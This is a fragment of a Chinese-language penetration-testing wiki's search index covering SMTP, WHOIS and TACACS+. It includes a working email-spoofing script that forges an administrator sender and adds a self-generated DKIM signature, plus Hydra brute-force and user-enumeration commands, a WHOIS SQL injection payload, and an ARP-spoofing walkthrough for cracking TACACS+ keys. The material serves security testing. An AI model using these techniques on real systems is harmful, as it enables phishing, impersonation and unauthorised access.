\u8fd9\u5c06\u53d1\u9001\u672a\u7b7e\u540d\u7684\u6d88\u606f mail(\"your_email@gmail.com\", \"Test Subject!\", \"hey! This is a test\", \"From: administrator@victim.com\"); Python # \u6765\u81ea https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py import os import dkim #pip3 install dkimpy import smtplib from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.base import MIMEBase # Set destination=\"destination@gmail.com\" sender=\"administrator@victim.com\" subject=\"Test\" message_html=\"\"\" <html> <body> <h3>This is a test, not a scam</h3> <br /> </body> </html> \"\"\" sender_domain=sender.split(\"@\")[1] # Prep os.system(\"sudo sed -ri 's/(myhostname) = (.*)/\\\\1 = \"+sender_domain+\"/g' /etc/postfix/main.cf\") os.system(\"systemctl restart postfix\") # \u751f\u6210 DKIM keys dkim_private_key_path=\"dkimprivatekey.pem\" os.system(f\"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null\") with open(dkim_private_key_path) as fh: dkim_private_key = fh.read() # \u751f\u6210\u7535\u5b50\u90ae\u4ef6 msg = MIMEMultipart(\"alternative\") msg.attach(MIMEText(message_html, \"html\")) msg[\"To\"] = destination msg[\"From\"] = sender msg[\"Subject\"] = subject headers = [b\"To\", b\"From\", b\"Subject\"] msg_data = msg.as_bytes() # \u4f7f\u7528dkim\u7b7e\u7f72\u7535\u5b50\u90ae\u4ef6 ## \u6536\u4ef6\u4eba\u5c06\u65e0\u6cd5\u68c0\u67e5\uff0c\u4f46\u7535\u5b50\u90ae\u4ef6\u5c06\u663e\u793a\u4e3a\u5df2\u7b7e\u540d\uff08\u56e0\u6b64\u66f4\u53ef\u4fe1\uff09 dkim_selector=\"s1\" sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers) msg[\"DKIM-Signature\"] = sig[len(\"DKIM-Signature: \") :].decode() msg_data = msg.as_bytes() # \u4f7f\u7528\u672c\u5730\u540e\u7f00\u4e2d\u7ee7\u53d1\u9001\u7535\u5b50\u90ae\u4ef6 smtp=\"127.0.0.1\" s = smtplib.SMTP(smtp) s.sendmail(sender, [destination], msg_data)","title":"\u53d1\u9001\u6076\u641e\u90ae\u4ef6"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_16","text":"\u5728 https://seanthegeek.net/459/demystifying-dmarc/ \u4e2d\u67e5\u627e\u6709\u5173\u8fd9\u4e9b\u4fdd\u62a4\u7684\u66f4\u591a\u4fe1\u606f","title":"\u66f4\u591a\u4fe1\u606f"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#smtp","text":"\u5982\u679c\u60a8\u53ef\u4ee5\u901a\u8fc7 SMTP \u53d1\u9001\u6570\u636e\uff0c [ \u8bf7\u9605\u8bfb\u6b64 ] \u3002","title":"\u901a\u8fc7 SMTP \u6e17\u900f"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_17","text":"","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_18","text":"\u901a\u5e38\uff0c\u5982\u679c\u5df2\u5b89\u88c5\uff0cin /etc/postfix/master.cf \u5305\u542b\u5728\u4f8b\u5982\u7528\u6237\u6536\u5230\u65b0\u90ae\u4ef6\u65f6 \u6267\u884c\u7684\u811a\u672c\u3002 \u4f8b\u5982\uff0c\u8be5\u884c flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient} \u8868\u793a /etc/postfix/filtering \u5982\u679c\u7528\u6237\u6807\u8bb0\u6536\u5230\u65b0\u90ae\u4ef6\uff0c\u5c06\u6267\u884c\u8be5\u884c\u3002 \u5176\u4ed6\u914d\u7f6e\u6587\u4ef6\uff1a sendmail.cf submit.cf","title":"\u540e\u7f00"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_19","text":"Protocol_Name: SMTP #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 25,465,587 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: Simple Mail Transfer Protocol #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for SMTP Note: | SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server. Entry_2: Name: Banner Grab Description: Grab SMTP Banner Command: nc -vn {IP} 25 Entry_3: Name: SMTP Vuln Scan Description: SMTP Vuln Scan With Nmap Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP} Entry_4: Name: SMTP User Enum Description: Enumerate uses with smtp-user-enum Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP} Entry_5: Name: SMTPS Connect Description: Attempt to connect to SMTPS two different ways Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587 Entry_6: Name: Find MX Servers Description: Find MX servers of an organization Command: dig +short mx {Domain_Name} Entry_7: Name: Hydra Brute Force Description: Need Nothing Command: hydra -P {Big_Passwordlist} {IP} smtp -V Entry_8: Name: consolesless mfs enumeration Description: SMTP enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f WHOIS\uff08\u53d1\u97f3\u4e3a \"who is\"\uff09\u662f\u4e00\u79cd\u5e38\u7528\u4e8e\u67e5\u8be2\u6570\u636e\u5e93\u7684\u67e5\u8be2\u548c\u54cd\u5e94\u534f\u8bae\uff0c\u8be5\u6570\u636e\u5e93\u5b58\u50a8\u4e92\u8054\u7f51\u8d44\u6e90\uff08\u5982\u57df\u540d\u3001IP\u5730\u5740\u5757\u6216\u81ea\u6cbb\u7cfb\u7edf\uff09\u7684\u6ce8\u518c\u7528\u6237\u6216\u6307\u5b9a\u8005\uff0c\u4f46\u4e5f\u7528\u4e8e\u67e5\u8be2\u5176\u4ed6\u66f4\u591a\u4fe1\u606f\u3002 (\u6765\u81ea \u8fd9\u91cc ) \u9ed8\u8ba4\u7aef\u53e3: 43 PORT STATE SERVICE 43/tcp open whois? \u679a\u4e3e \u83b7\u53d6whois\u670d\u52a1\u6240\u62e5\u6709\u7684\u6709\u5173\u57df\u540d\u7684\u6240\u6709\u4fe1\u606f\u3002 whois -h <HOST> -p <PORT> \"domain.tld\" echo \"domain.ltd\" | nc -vn <HOST> <PORT> \u8bf7\u6ce8\u610f\uff0c\u6709\u65f6\u5f53\u5411WHOIS\u670d\u52a1\u8bf7\u6c42\u4fe1\u606f\u65f6\uff0c\u54cd\u5e94\u4e2d\u4f1a\u51fa\u73b0\u4f7f\u7528\u7684\u6570\u636e\u5e93\u3002 \u6b64\u5916\uff0cWHOIS \u670d\u52a1\u59cb\u7ec8\u9700\u8981\u4f7f\u7528 \u6570\u636e\u5e93 \u6765\u5b58\u50a8\u548c\u63d0\u53d6\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u6839\u636e\u7528\u6237\u63d0\u4f9b\u7684\u67d0\u4e9b\u4fe1\u606f \u67e5\u8be2 \u6570\u636e\u5e93\u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0 SQLInjection \u3002 \u4f8b\u5982\uff1a\u60a8\u53ef\u4ee5\u63d0\u53d6\u6570\u636e\u5e93\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4fe1\u606f \u3002 whois -h 10.10.10.155 -p 43 \"a') or 1=1#\" Shodan port:43 whois \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: WHOIS #WHOIS\u534f\u8bae\u6ca1\u6709\u7f29\u5199\u3002 Port_Number: 43 #\u5bf9\u4e8e\u591a\u4e2a\u9009\u9879\uff0c\u53ef\u4ee5\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6709\u591a\u4e2a\u57df\u540d\u53ef\u4ee5\u4f7f\u7528WHOIS\u67e5\u8be2\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1awhois domain1.com, domain2.net, domain3.org\u3002\u8fd9\u5c06\u8fd4\u56de\u8fd9\u4e09\u4e2a\u57df\u540d\u7684WHOIS\u4fe1\u606f\uff0c\u6bcf\u4e2a\u57df\u540d\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: WHOIS #WHOIS\u534f\u8bae\u6ca1\u6709\u7f29\u5199\u3002 Entry_1: Name: Notes Description: Notes for WHOIS Note: | WHOIS\uff08\u53d1\u97f3\u4e3a \"who is\"\uff09\u662f\u4e00\u79cd\u5e38\u7528\u4e8e\u67e5\u8be2\u6570\u636e\u5e93\u7684\u67e5\u8be2\u548c\u54cd\u5e94\u534f\u8bae\uff0c\u8be5\u6570\u636e\u5e93\u5b58\u50a8\u4e92\u8054\u7f51\u8d44\u6e90\uff08\u5982\u57df\u540d\u3001IP\u5730\u5740\u5757\u6216\u81ea\u6cbb\u7cfb\u7edf\uff09\u7684\u6ce8\u518c\u7528\u6237\u6216\u6307\u5b9a\u8005\uff0c\u4f46\u4e5f\u7528\u4e8e\u67e5\u8be2\u5176\u4ed6\u66f4\u591a\u4fe1\u606f\u3002\uff08\u6765\u81ea\u8fd9\u91cc\uff09 Entry_2: Name: Banner Grab Description: Grab WHOIS Banner Command: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43","title":"43 - WHOIS\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"WHOIS\uff08\u53d1\u97f3\u4e3a \"who is\"\uff09\u662f\u4e00\u79cd\u5e38\u7528\u4e8e\u67e5\u8be2\u6570\u636e\u5e93\u7684\u67e5\u8be2\u548c\u54cd\u5e94\u534f\u8bae\uff0c\u8be5\u6570\u636e\u5e93\u5b58\u50a8\u4e92\u8054\u7f51\u8d44\u6e90\uff08\u5982\u57df\u540d\u3001IP\u5730\u5740\u5757\u6216\u81ea\u6cbb\u7cfb\u7edf\uff09\u7684\u6ce8\u518c\u7528\u6237\u6216\u6307\u5b9a\u8005\uff0c\u4f46\u4e5f\u7528\u4e8e\u67e5\u8be2\u5176\u4ed6\u66f4\u591a\u4fe1\u606f\u3002 (\u6765\u81ea \u8fd9\u91cc ) \u9ed8\u8ba4\u7aef\u53e3: 43 PORT STATE SERVICE 43/tcp open whois?","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"\u83b7\u53d6whois\u670d\u52a1\u6240\u62e5\u6709\u7684\u6709\u5173\u57df\u540d\u7684\u6240\u6709\u4fe1\u606f\u3002 whois -h <HOST> -p <PORT> \"domain.tld\" echo \"domain.ltd\" | nc -vn <HOST> <PORT> \u8bf7\u6ce8\u610f\uff0c\u6709\u65f6\u5f53\u5411WHOIS\u670d\u52a1\u8bf7\u6c42\u4fe1\u606f\u65f6\uff0c\u54cd\u5e94\u4e2d\u4f1a\u51fa\u73b0\u4f7f\u7528\u7684\u6570\u636e\u5e93\u3002 \u6b64\u5916\uff0cWHOIS \u670d\u52a1\u59cb\u7ec8\u9700\u8981\u4f7f\u7528 \u6570\u636e\u5e93 \u6765\u5b58\u50a8\u548c\u63d0\u53d6\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u5f53\u6839\u636e\u7528\u6237\u63d0\u4f9b\u7684\u67d0\u4e9b\u4fe1\u606f \u67e5\u8be2 \u6570\u636e\u5e93\u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0 SQLInjection \u3002 \u4f8b\u5982\uff1a\u60a8\u53ef\u4ee5\u63d0\u53d6\u6570\u636e\u5e93\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4fe1\u606f \u3002 whois -h 10.10.10.155 -p 43 \"a') or 1=1#\"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#shodan","text":"port:43 whois","title":"Shodan"},{"location":"Network%20Prot/43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"Protocol_Name: WHOIS #WHOIS\u534f\u8bae\u6ca1\u6709\u7f29\u5199\u3002 Port_Number: 43 #\u5bf9\u4e8e\u591a\u4e2a\u9009\u9879\uff0c\u53ef\u4ee5\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6709\u591a\u4e2a\u57df\u540d\u53ef\u4ee5\u4f7f\u7528WHOIS\u67e5\u8be2\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1awhois domain1.com, domain2.net, domain3.org\u3002\u8fd9\u5c06\u8fd4\u56de\u8fd9\u4e09\u4e2a\u57df\u540d\u7684WHOIS\u4fe1\u606f\uff0c\u6bcf\u4e2a\u57df\u540d\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: WHOIS #WHOIS\u534f\u8bae\u6ca1\u6709\u7f29\u5199\u3002 Entry_1: Name: Notes Description: Notes for WHOIS Note: | WHOIS\uff08\u53d1\u97f3\u4e3a \"who is\"\uff09\u662f\u4e00\u79cd\u5e38\u7528\u4e8e\u67e5\u8be2\u6570\u636e\u5e93\u7684\u67e5\u8be2\u548c\u54cd\u5e94\u534f\u8bae\uff0c\u8be5\u6570\u636e\u5e93\u5b58\u50a8\u4e92\u8054\u7f51\u8d44\u6e90\uff08\u5982\u57df\u540d\u3001IP\u5730\u5740\u5757\u6216\u81ea\u6cbb\u7cfb\u7edf\uff09\u7684\u6ce8\u518c\u7528\u6237\u6216\u6307\u5b9a\u8005\uff0c\u4f46\u4e5f\u7528\u4e8e\u67e5\u8be2\u5176\u4ed6\u66f4\u591a\u4fe1\u606f\u3002\uff08\u6765\u81ea\u8fd9\u91cc\uff09 Entry_2: Name: Banner Grab Description: Grab WHOIS Banner Command: whois -h {IP} -p 43 {Domain_Name} && echo {Domain_Name} | nc -vn {IP} 43","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/","text":"\u57fa\u672c\u4fe1\u606f Terminal Access Controller Access Control System (TACACS) \u662f\u4e00\u79cd\u5b89\u5168\u534f\u8bae\uff0c\u53ef\u4ee5\u63d0\u4f9b\u7528\u6237\u5c1d\u8bd5\u8bbf\u95ee\u8def\u7531\u5668\u6216 NAS \u7684\u4e2d\u592e\u9a8c\u8bc1\u3002TACACS+ \u662f TACACS \u534f\u8bae\u7684\u66f4\u65b0\u7248\u672c\uff0c\u63d0\u4f9b\u5355\u72ec\u7684\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u548c\u8bb0\u5e10\uff08AAA\uff09\u670d\u52a1\u3002 PORT STATE SERVICE 49/tcp open tacacs \u9ed8\u8ba4\u7aef\u53e3: 49 \u62e6\u622a\u8ba4\u8bc1\u5bc6\u94a5 \u5982\u679c\u653b\u51fb\u8005\u8bbe\u6cd5\u8fdb\u5165\u5ba2\u6237\u7aef\u548c TACACS \u670d\u52a1\u5668\u4e4b\u95f4\uff0c \u4ed6\u53ef\u4ee5\u62e6\u622a\u52a0\u5bc6\u5f62\u5f0f\u7684\u8eab\u4efd\u9a8c\u8bc1\u5bc6\u94a5 \uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u672c\u5730\u66b4\u529b\u7834\u89e3\u3002\u6240\u4ee5\u4f60\u4eec\u90fd\u66b4\u529b\u7834\u89e3\u4e86\u5bc6\u94a5\uff0c\u5e76\u4e14\u6ca1\u6709\u51fa\u73b0\u5728\u65e5\u5fd7\u4e2d\u3002\u5982\u679c\u60a8\u8bbe\u6cd5\u66b4\u529b\u7834\u89e3\u5bc6\u94a5\uff0c \u60a8\u5c06\u80fd\u591f\u8bbf\u95ee\u7f51\u7edc\u8bbe\u5907\u5e76\u89e3\u5bc6 Wireshark \u4e2d\u7684\u6d41\u91cf\u3002 \u4e2d\u95f4\u4eba\u653b\u51fb \u4e3a\u4e86\u6267\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\uff1a ARP spoofing attack . \u66b4\u529b\u7834\u89e3\u5bc6\u94a5 \u73b0\u5728\u60a8\u9700\u8981\u8fd0\u884c Loki \u3002\u8fd9\u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u5206\u6790 L2/L3 \u534f\u8bae\u5b89\u5168\u6027\u7684\u5de5\u5177\u3002 \u5b83\u7684\u80fd\u529b\u4e0e\u6d41\u884c\u7684\u8036\u5c14\u68ee\u6c0f\u83cc \u4e00\u6837\u597d\uff0c\u662f\u5b83\u7684\u6709\u529b\u7ade\u4e89\u8005\u3002Loki \u8fd8\u53ef\u4ee5\u66b4\u529b\u7834\u89e3 TACACS \u5bc6\u94a5\u3002\u5982\u679c\u5bc6\u94a5\u88ab\u6210\u529f \u66b4\u529b\u7834\u89e3 \uff08 \u901a\u5e38\u662f MD5 \u52a0\u5bc6\u683c\u5f0f\uff09 \uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8bbe\u5907\u5e76\u89e3\u5bc6 TACACS \u52a0\u5bc6\u7684\u6d41\u91cf\u3002 sudo loki_gtk.py \u60a8\u8fd8\u9700\u8981\u6307\u5b9a\u5b57\u5178\u7684\u8def\u5f84\u4ee5\u66b4\u529b\u7834\u89e3\u52a0\u5bc6\u5bc6\u94a5\u3002\u8bf7\u52a1\u5fc5\u53d6\u6d88\u9009\u4e2d \u4f7f\u7528\u66b4\u529b\u7834\u89e3 \u9009\u9879\uff0c\u5426\u5219 Loki \u5c06\u5728\u4e0d\u4f7f\u7528\u5b57\u5178\u7684\u60c5\u51b5\u4e0b\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u3002 \u73b0\u5728\u6211\u4eec\u5fc5\u987b\u7b49\u5f85\u7ba1\u7406\u5458\u901a\u8fc7 TACACS \u670d\u52a1\u5668\u767b\u5f55\u8bbe\u5907\u3002\u5047\u8bbe\u7f51\u7edc\u7ba1\u7406\u5458\u5df2\u7ecf\u767b\u5f55\uff0c\u6211\u4eec \u901a\u8fc7 ARP \u6b3a\u9a97\u7ad9\u5728\u4e2d\u95f4 \uff0c\u62e6\u622a\u6d41\u91cf\u3002\u8fd9\u6837\u505a\u65f6\uff0c\u5408\u6cd5\u4e3b\u673a\u4e0d\u4f1a\u610f\u8bc6\u5230\u5176\u4ed6\u4eba\u5e72\u6270\u4e86\u4ed6\u4eec\u7684\u8fde\u63a5\u3002 \u73b0\u5728\u70b9\u51fb CRACK \u6309\u94ae\uff0c\u7b49\u5f85 Loki \u7834\u89e3\u5bc6\u7801\u3002 \u89e3\u5bc6\u6d41\u91cf \u6211\u4eec\u6210\u529f\u89e3\u9501\u4e86\u5bc6\u94a5\uff0c\u73b0\u5728\u6211\u4eec\u9700\u8981\u89e3\u5bc6 TACACS \u6d41\u91cf\u3002\u6b63\u5982\u6211\u6240\u8bf4\uff0c\u5982\u679c\u5b58\u5728\u5bc6\u94a5\uff0cWireshark \u53ef\u4ee5\u5904\u7406\u52a0\u5bc6\u7684 TACACS \u6d41\u91cf\u3002 \u6211\u4eec\u770b\u5230\u4f7f\u7528\u4e86\u54ea\u4e2a\u6a2a\u5e45\u3002 \u6211\u4eec\u627e\u5230\u7528\u6237\u7684\u7528\u6237\u540d admin \u56e0\u6b64\uff0c \u6211\u4eec\u62e5\u6709 admin:secret1234 \u53ef\u7528\u4e8e\u8bbf\u95ee\u786c\u4ef6\u672c\u8eab\u7684 \u51ed\u636e\u3002 \u68c0\u67e5\u5b83\u4eec\u7684\u6709\u6548\u6027\u3002** \u8fd9\u5c31\u662f\u4f60\u5982\u4f55\u653b\u51fb TACACS+ \u5e76 \u83b7\u5f97 \u5bf9\u7f51\u7edc\u8bbe\u5907\u63a7\u5236\u9762\u677f\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u53c2\u8003 \u62e6\u622a\u5173\u952e\u90e8\u5206\u590d\u5236\u81eahttps://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9","title":"49 - TACACS \u6e17\u900f"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_1","text":"Terminal Access Controller Access Control System (TACACS) \u662f\u4e00\u79cd\u5b89\u5168\u534f\u8bae\uff0c\u53ef\u4ee5\u63d0\u4f9b\u7528\u6237\u5c1d\u8bd5\u8bbf\u95ee\u8def\u7531\u5668\u6216 NAS \u7684\u4e2d\u592e\u9a8c\u8bc1\u3002TACACS+ \u662f TACACS \u534f\u8bae\u7684\u66f4\u65b0\u7248\u672c\uff0c\u63d0\u4f9b\u5355\u72ec\u7684\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u548c\u8bb0\u5e10\uff08AAA\uff09\u670d\u52a1\u3002 PORT STATE SERVICE 49/tcp open tacacs \u9ed8\u8ba4\u7aef\u53e3: 49","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_2","text":"\u5982\u679c\u653b\u51fb\u8005\u8bbe\u6cd5\u8fdb\u5165\u5ba2\u6237\u7aef\u548c TACACS \u670d\u52a1\u5668\u4e4b\u95f4\uff0c \u4ed6\u53ef\u4ee5\u62e6\u622a\u52a0\u5bc6\u5f62\u5f0f\u7684\u8eab\u4efd\u9a8c\u8bc1\u5bc6\u94a5 \uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u672c\u5730\u66b4\u529b\u7834\u89e3\u3002\u6240\u4ee5\u4f60\u4eec\u90fd\u66b4\u529b\u7834\u89e3\u4e86\u5bc6\u94a5\uff0c\u5e76\u4e14\u6ca1\u6709\u51fa\u73b0\u5728\u65e5\u5fd7\u4e2d\u3002\u5982\u679c\u60a8\u8bbe\u6cd5\u66b4\u529b\u7834\u89e3\u5bc6\u94a5\uff0c \u60a8\u5c06\u80fd\u591f\u8bbf\u95ee\u7f51\u7edc\u8bbe\u5907\u5e76\u89e3\u5bc6 Wireshark \u4e2d\u7684\u6d41\u91cf\u3002","title":"\u62e6\u622a\u8ba4\u8bc1\u5bc6\u94a5"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_3","text":"\u4e3a\u4e86\u6267\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\uff1a ARP spoofing attack .","title":"\u4e2d\u95f4\u4eba\u653b\u51fb"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_4","text":"\u73b0\u5728\u60a8\u9700\u8981\u8fd0\u884c Loki \u3002\u8fd9\u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u5206\u6790 L2/L3 \u534f\u8bae\u5b89\u5168\u6027\u7684\u5de5\u5177\u3002 \u5b83\u7684\u80fd\u529b\u4e0e\u6d41\u884c\u7684\u8036\u5c14\u68ee\u6c0f\u83cc \u4e00\u6837\u597d\uff0c\u662f\u5b83\u7684\u6709\u529b\u7ade\u4e89\u8005\u3002Loki \u8fd8\u53ef\u4ee5\u66b4\u529b\u7834\u89e3 TACACS \u5bc6\u94a5\u3002\u5982\u679c\u5bc6\u94a5\u88ab\u6210\u529f \u66b4\u529b\u7834\u89e3 \uff08 \u901a\u5e38\u662f MD5 \u52a0\u5bc6\u683c\u5f0f\uff09 \uff0c \u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee\u8bbe\u5907\u5e76\u89e3\u5bc6 TACACS \u52a0\u5bc6\u7684\u6d41\u91cf\u3002 sudo loki_gtk.py \u60a8\u8fd8\u9700\u8981\u6307\u5b9a\u5b57\u5178\u7684\u8def\u5f84\u4ee5\u66b4\u529b\u7834\u89e3\u52a0\u5bc6\u5bc6\u94a5\u3002\u8bf7\u52a1\u5fc5\u53d6\u6d88\u9009\u4e2d \u4f7f\u7528\u66b4\u529b\u7834\u89e3 \u9009\u9879\uff0c\u5426\u5219 Loki \u5c06\u5728\u4e0d\u4f7f\u7528\u5b57\u5178\u7684\u60c5\u51b5\u4e0b\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u3002 \u73b0\u5728\u6211\u4eec\u5fc5\u987b\u7b49\u5f85\u7ba1\u7406\u5458\u901a\u8fc7 TACACS \u670d\u52a1\u5668\u767b\u5f55\u8bbe\u5907\u3002\u5047\u8bbe\u7f51\u7edc\u7ba1\u7406\u5458\u5df2\u7ecf\u767b\u5f55\uff0c\u6211\u4eec \u901a\u8fc7 ARP \u6b3a\u9a97\u7ad9\u5728\u4e2d\u95f4 \uff0c\u62e6\u622a\u6d41\u91cf\u3002\u8fd9\u6837\u505a\u65f6\uff0c\u5408\u6cd5\u4e3b\u673a\u4e0d\u4f1a\u610f\u8bc6\u5230\u5176\u4ed6\u4eba\u5e72\u6270\u4e86\u4ed6\u4eec\u7684\u8fde\u63a5\u3002 \u73b0\u5728\u70b9\u51fb CRACK \u6309\u94ae\uff0c\u7b49\u5f85 Loki \u7834\u89e3\u5bc6\u7801\u3002","title":"\u66b4\u529b\u7834\u89e3\u5bc6\u94a5"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_5","text":"\u6211\u4eec\u6210\u529f\u89e3\u9501\u4e86\u5bc6\u94a5\uff0c\u73b0\u5728\u6211\u4eec\u9700\u8981\u89e3\u5bc6 TACACS \u6d41\u91cf\u3002\u6b63\u5982\u6211\u6240\u8bf4\uff0c\u5982\u679c\u5b58\u5728\u5bc6\u94a5\uff0cWireshark \u53ef\u4ee5\u5904\u7406\u52a0\u5bc6\u7684 TACACS \u6d41\u91cf\u3002 \u6211\u4eec\u770b\u5230\u4f7f\u7528\u4e86\u54ea\u4e2a\u6a2a\u5e45\u3002 \u6211\u4eec\u627e\u5230\u7528\u6237\u7684\u7528\u6237\u540d admin \u56e0\u6b64\uff0c \u6211\u4eec\u62e5\u6709 admin:secret1234 \u53ef\u7528\u4e8e\u8bbf\u95ee\u786c\u4ef6\u672c\u8eab\u7684 \u51ed\u636e\u3002 \u68c0\u67e5\u5b83\u4eec\u7684\u6709\u6548\u6027\u3002** \u8fd9\u5c31\u662f\u4f60\u5982\u4f55\u653b\u51fb TACACS+ \u5e76 \u83b7\u5f97 \u5bf9\u7f51\u7edc\u8bbe\u5907\u63a7\u5236\u9762\u677f\u7684\u8bbf\u95ee\u6743\u9650\u3002","title":"\u89e3\u5bc6\u6d41\u91cf"},{"location":"Network%20Prot/49-TACACS%2B%E6%B8%97%E9%80%8F/#_6","text":"\u62e6\u622a\u5173\u952e\u90e8\u5206\u590d\u5236\u81eahttps://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9","title":"\u53c2\u8003"},{"location":"Network%20Prot/53%20-%20DNS%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f \u57df\u540d\u7cfb\u7edf (DNS) \u662f Internet \u7684\u7535\u8bdd\u7c3f\u3002\u4eba\u4eec\u901a\u8fc7\u57df\u540d\u5728\u7ebf\u8bbf\u95ee\u4fe1\u606f\uff0c\u4f8b\u5982 nytimes.com \u6216 espn.com\u3002Web \u6d4f\u89c8\u5668\u901a\u8fc7 Internet \u534f\u8bae (IP) \u5730\u5740\u8fdb\u884c\u4ea4\u4e92\u3002DNS \u5c06\u57df\u540d\u8f6c\u6362\u4e3a IP \u5730\u5740 \uff0c\u4ee5\u4fbf\u6d4f\u89c8\u5668\u53ef\u4ee5\u52a0\u8f7d Internet \u8d44\u6e90\u3002 \u9ed8\u8ba4\u7aef\u53e3: 53 PORT STATE SERVICE REASON 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) 5353/udp open zeroconf udp-response 53/udp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) \u4e0d\u540c\u7684 DNS \u670d\u52a1\u5668 \u4fe1\u606f\u6765\u81ea https://academy.hackthebox.com/module/112/section/1069 \u670d\u52a1\u5668\u7c7b\u578b \u63cf\u8ff0 DNS 